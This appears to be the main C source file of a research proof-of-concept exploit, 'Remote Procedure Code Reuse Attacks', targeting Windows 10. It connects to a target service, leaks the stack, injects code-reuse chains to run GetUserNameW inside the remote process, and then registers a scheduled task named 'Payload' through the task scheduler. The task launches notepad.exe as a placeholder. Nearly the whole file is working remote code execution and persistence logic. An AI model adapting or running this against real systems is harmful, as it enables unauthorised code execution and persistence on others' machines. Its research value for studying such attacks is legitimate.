/*
 * Remote Procedure Code Reuse Attacks
 * 
 * @author: Adrián Barreal
 *
 *
 * The exploit was tested in the following conditions:
 *
 *  - Windows 10 Home 10.0.17134
 *
 *  - Programs were compiled with cl 19.16.27030.1
 *
 *
 * Note: this exploit assumes a little endian host and a little endian target.
 *
 *
 * Compiled with
 *
 *     cl rpcra.c connection.c crp.c injector.c rsched.c /Fe: rpcra.exe
 *
 */

#include <windows.h>
#include <wchar.h>
#include <stdint.h>
#include <stdio.h>

#include "connection.h"
#include "injector.h"

#define TARGET_IP_ADDRESS "127.0.0.1"
#define TARGET_PORT 16000

#define MAX_USERNAME_WLEN 32
#define XML_USERNAME_INDEX 0x124

wchar_t *task_path = L"\\Payload";

/* The next string defines the task registration XML to be submitted to the remote
 * task scheduler. Notice that it has an X for the username. The X will be replaced
 * for the target process' username, retrieved by remote_GetUserNameW.
 *
 * Keep in mind that the task will not execute twice without deleting it first 
 * from the task scheduler. It should be found in the root directory under 
 * the name "Payload".
 *
 */
wchar_t *task_xml = L"<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><RegistrationInfo><Description>Run payload.</Description></RegistrationInfo><Triggers><RegistrationTrigger></RegistrationTrigger></Triggers><Principals><Principal><UserId>X                               </UserId><LogonType>InteractiveToken</LogonType></Principal></Principals><Settings><Enabled>true</Enabled><AllowStartOnDemand>true</AllowStartOnDemand><AllowHardTerminate>true</AllowHardTerminate><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries></Settings><Actions><Exec><Command>c:/windows/system32/notepad.exe</Command></Exec></Actions></Task>";

/* main
 *
 * As it looks, this is the whole payload layer. Notice that it is just plain C code.
 * There is no hint of code reuse techniques here, either.
 *
 */
int main(int argc, char **argv) {
    uint32_t wlen = MAX_USERNAME_WLEN;
    uint64_t r_task_xml = 0;
    uint64_t r_binding_handle = 0;
    
    /* Configure networking to connect to TARGET_IP_ADDRESS:TARGET_PORT.
     *
     */
    configure_target_address(TARGET_IP_ADDRESS, TARGET_PORT);
    
    /* Initialize the injection subsystem. This will actually connect to the server, leak
     * the stack, and compute several addresses.
     *
     */
    if (initialize_injector() < 0) {
        return 1;
    }

    /* This is the first remote call to retrieve the remote user's name and use it to
     * fill the task registration XML. From the outside it's just a function, but inside 
     * there are several CRP injections to load advapi32.dll into the target process,
     * to find GetUserNameW, and to actually execute it.
     *
     */
    if (remote_GetUserNameW(&task_xml[XML_USERNAME_INDEX], &wlen) < 0) {
        return 1;
    }
    
    /* We have to remove the null character at the end of the user name.
     *
     */
    task_xml[XML_USERNAME_INDEX + wlen - 1] = L' ';
    
    /* Prepare for the remote call to the task scheduler. We first obtain a binding handle,
     * and then call remote_RegisterTask to actually register the task in the target system.
     *
     */
    if (remote_GetSchedBindingHandle(&r_binding_handle) < 0) {
        return 1;
    }
    if (remote_RegisterTask(r_binding_handle, task_path, task_xml) < 0) {
        return 1;
    }
    
    return 0;
}
